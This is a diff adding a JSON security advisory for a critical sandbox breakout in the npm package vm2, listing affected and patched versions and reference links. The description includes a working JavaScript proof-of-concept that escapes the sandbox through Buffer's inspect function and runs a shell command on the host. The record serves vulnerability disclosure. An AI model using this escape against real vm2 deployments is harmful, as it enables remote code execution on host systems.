@@ -1,0 +1,65 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-05T16:33:18Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 352982,
+    "Id": "GSA_kwCzR0hTQS12MzdoLTVtZm0tYzQ3Y84ABWLW",
+    "GhsaId": "GHSA-v37h-5mfm-c47c",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-v37h-5mfm-c47c"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24781"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/8d30d93213c1898b3e035298b89a814970dd1189"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/bdd3d15e57bc4ec5e70365cd79f7cb0256e5f88c"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/fd266d084e0a3322d0f71ba2a8dc4c96cd030228"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-v37h-5mfm-c47c"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-v37h-5mfm-c47c"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-24781"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability through the `inspect` function. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nThe node `inspect` method allows to log details of objects. To get to the details, the implementation unwraps proxies. The unwrapped values can be extracted using the `this.seen` of the `stylize` function. This allows to get access to the internal proxy handler of VM2 which contains the sandbox object. Since the access to the handler is itself wrapped by a VM2 proxy, accessing the sandbox object in the proxy handler will result in a wrapped sandbox object given into the sandbox. This allows to write a wrapped host object to the wrapped sandbox object and read the raw host object from the raw sandbox object bypassing the proxy bridge.\n\n### PoC\n\n```js\nconst obj = {\n\tsubarray: Buffer.prototype.inspect,\n\tslice: Buffer.prototype.slice,\n\thexSlice:()=\u003e'',\n\tl:{__proto__: null}\n};\n\nobj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {\n\tif (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;\n\treturn a;\n}});\nobj.l.x.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-05T16:33:14Z",
+    "Severity": "CRITICAL",
+    "Summary": "VM2 Has Sandbox Breakout Through Inspect Function",
+    "UpdatedAt": "2026-05-05T16:33:18Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.0"
+      },
+      "VulnerableVersionRange": "\u003c= 3.10.3"
+    }
+  ]
+}
